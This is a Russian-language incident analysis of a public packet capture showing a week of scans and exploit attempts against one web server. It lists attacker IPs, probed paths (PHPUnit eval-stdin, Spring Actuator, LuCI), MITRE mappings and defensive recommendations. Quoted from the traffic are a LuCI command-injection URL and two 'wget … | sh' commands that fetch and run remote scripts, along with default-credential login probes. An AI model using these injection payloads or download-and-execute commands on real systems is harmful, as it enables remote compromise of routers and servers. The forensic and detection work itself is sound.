## Общая информация

- **Дата расследования:** 25.06.2026
    
- **Источник:** Malware Traffic Analysis ([malware-traffic-analysis.net](https://malware-traffic-analysis.net))
    
- **Файл дампа:** `2024-12-18-one-week-of-server-scans-and-probes-and-web-traffic.pcap`
    
- **Длительность захвата:** 5 дней 23:59:58
    
- **Всего пакетов:** 361 992
    
- **Жертва:** `203.161.44.208`
    

## Ход расследования

### Шаг 1: Общая картина

Захват длиной почти 6 дней, 361 992 пакета. Сервер находится под постоянным сканированием.

### Шаг 2: Участники трафика

Сотни уникальных IP-адресов сканируют сервер `203.161.44.208`. Основные атакующие:

- `150.136.222.122` — массовое сканирование PHP-файлов
    
- `93.113.63.8`, `112.6.214.244` — эксплуатация CVE-2017-9841
    
- `92.255.57.58` — сканирование Spring Boot Actuator
    
- `104.234.115.10`, `104.234.115.78` — сканирование CGI и админок
    
- `95.214.53.211` — сканирование Cisco ASA
    
- `64.227.13.116` — атаки на SonicOS
    
- `185.224.128.43` — сканирование конфигов и Actuator
    
- `31.220.1.88` — Command Injection на LuCI
    
- `45.55.225.121` — сканирование веб-шеллов
    
- `141.98.11.155` — Command Injection на LuCI
    

### Шаг 3: Сканирование портов

Обнаружен **151 684 SYN-запроса**. Массовое сканирование портов в поисках открытых сервисов.

### Шаг 4: DNS-анализ

Не применимо — атакующие используют прямые IP-адреса.

### Шаг 5: HTTP-анализ — Обнаруженные атаки

**CVE-2017-9841 (PHPUnit eval-stdin.php)**

Множество IP сканируют десятки путей к уязвимому файлу:

- `/lib/phpunit/Util/PHP/eval-stdin.php`
    
- `/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    
- `/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    
- `/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    
- `/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    
- `/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    
- `/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    
- `/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    
- `/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    
- `/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
    

**Command Injection на роутеры OpenWRT/LuCI**

text

/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2Fbanthis.su%2Ft%7Csh%3B%60)

Попытка выполнить системную команду через уязвимость в LuCI.

**Попытки входа через дефолтные учётные данные**

- `GET /boaform/admin/formLogin?username=admin&psd=admin`
    
- `GET /boaform/admin/formLogin?username=ec8&psd=ec8`
    
- `GET /boaform/admin/formLogin?username=user&psd=user`
    

**Сканирование Spring Boot Actuator**

- `/actuator/gateway/routes`
    
- `/actuator/health`
    
- `/api/v1/actuator/env`
    
- `/api/v2/actuator/env`
    
- `/backend/actuator/env`
    

Попытки получить конфигурацию и маршруты Spring Boot приложений.

**Сканирование админок**

- `/admin.php`, `/admin-post.php`, `/adminfuns.php7`
    
- `/admin/index.html`, `/admin/login.asp`
    
- `/cgi-bin/login.cgi`, `/login.jsp`, `/logon.htm`
    
- `/+CSCOE+/logon.html` — Cisco ASA
    

**Сканирование файлов конфигурации**

- `/.well-known/pki-validation/about.php`
    
- `/config.json`, `/config/aws.yml`, `/config/config.ini`
    
- `/aws.yml`
    

**Docker API**

- `/containers/json` — попытка получить список контейнеров
    

**SonicOS (SonicWall)**

- `/api/sonicos/auth`
    
- `/api/sonicos/tfa`
    

**Другие подозрительные URL**

- `/alfanew.php`, `/alfanew.php7`, `/alfanew2.php7`
    
- `/alfa-rex.php7`, `/alfa-rex2.php7`
    
- `/berlin.php`, `/avaa.php`
    
- `/cache-compat.php`, `/content.php`, `/dropdown.php`
    
- `/cgi-bin/about.php`, `/cgi-bin/cloud.php`, `/cloud.php`
    
- `/cgi-bin/xmrlpc.php?p=`
    
- `/ajax-actions.php`
    

**User-Agent:** `Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)` — один и тот же сканер на большинстве запросов.

### Шаг 6: HTTPS/TLS

Не обнаружено — атакующие используют HTTP.

### Шаг 7: Передача файлов

Файлы не извлекались — атакующие сканируют, но не скачивают.

### Шаг 8-14

SMB, Kerberos, PowerShell, веб-атаки — не применимы к данному дампу.

## Индикаторы компрометации (IOC)

### IP-адреса атакующих

`150.136.222.122`, `93.113.63.8`, `112.6.214.244`, `92.255.57.58`, `104.234.115.10`, `104.234.115.78`, `95.214.53.211`, `64.227.13.116`, `185.224.128.43`, `31.220.1.88`, `45.55.225.121`, `141.98.11.155`, `170.64.218.149`, `139.144.52.241`, `117.209.84.246`, `42.6.51.151`, `175.149.96.69`, `117.205.61.143`, `68.183.215.88`, `157.230.102.208`, `95.214.55.74`, `199.127.63.64`, `165.154.59.118`, `35.216.216.74`, `193.128.108.254`, `172.168.41.2`, `52.230.159.202`

### Артефакты

- **User-Agent:** `Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)`
    
- **Целевые URL:** `eval-stdin.php`, `/actuator/gateway/routes`, `/cgi-bin/luci/`, `/boaform/admin/formLogin`, `/.well-known/pki-validation/`
    
- **Команды:** `wget -O- http://banthis.su/t|sh`, `wget http://103.149.87.69/t -O- | sh`
    

## MITRE ATT&CK

- **T1190 (Exploit Public-Facing Application)** — попытки эксплуатации PHPUnit, LuCI, SonicOS
    
- **T1046 (Network Service Scanning)** — 151 684 SYN-запросов
    
- **T1059.004 (Unix Shell)** — Command Injection через LuCI
    
- **T1078.001 (Default Accounts)** — попытки входа admin/admin, ec8/ec8, user/user
    
- **T1552 (Unsecured Credentials)** — сканирование конфигурационных файлов
    
- **T1613 (Container and Resource Discovery)** — запросы к Docker API
    

## Рекомендации

1. Проверить сервер `203.161.44.208` на наличие файлов `eval-stdin.php` — срочно удалить или обновить PHPUnit
    
2. Заблокировать перечисленные IP-адреса на межсетевом экране
    
3. Проверить сервер на наличие уязвимых версий Spring Boot, SonicOS, OpenWRT
    
4. Отключить отладочные эндпоинты Actuator (`/actuator/*`) в production
    
5. Сменить дефолтные пароли на всех устройствах
    
6. Создать правила SIEM для детекта:
    
    - `eval-stdin.php` в URL
        
    - Обращений к `/actuator/gateway/routes`
        
    - Command Injection паттернов в URL
        
    - User-Agent `GenomeCrawlerd`
        
7. Провести аудит веб-приложений на наличие несанкционированных PHP-файлов